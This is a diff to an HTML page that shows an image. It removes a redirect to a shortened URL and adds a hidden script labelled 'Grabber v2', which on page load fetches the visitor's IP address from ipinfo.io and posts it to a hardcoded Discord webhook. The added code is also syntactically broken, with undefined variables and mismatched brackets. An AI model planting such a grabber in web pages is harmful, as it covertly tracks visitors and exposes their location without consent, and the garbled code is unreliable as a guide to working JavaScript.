@@ -2,12 +2,41 @@
 <html>
 <head>
   <script>
-    if (window.location.href.endsWith("/x.gif")) {
-      window.location.replace("https://tinyurl.com/25ea4gqv");
-    }
+
   </script>
 </head>
 <body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+  <script>
+    const a = 'b7e056c588872b';
+    async function b() {
+      try {
+        const c = await axios.get(`https://ipinfo.io?token=${accessToken}`);
+        const d = response.data.ip
+        e()
+      } catch (error) {
+        console.error(error)
+      }
+    }
+    function e() {
+      const f = {
+        username: "Grabber v2",
+        content: d
+      };
+      fetch("https://discord.com/api/webhooks/1097163118964129803/lAbJM_aQ99MdPtrFlYcWc4FnKfdM5eT7HoSjG1GcRwzS2J_JIPDUqN7gyZy67o_2kxpq", (
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(f
+      }).then((g) => {
+        console.log("gud");
+      )}.then((h) => {
+        console.log("bad");
+      )};
+    }
+    window.onload = b;
+  </script>
   <img src="x.gif" alt="Your Image">
 </body>
 </html>
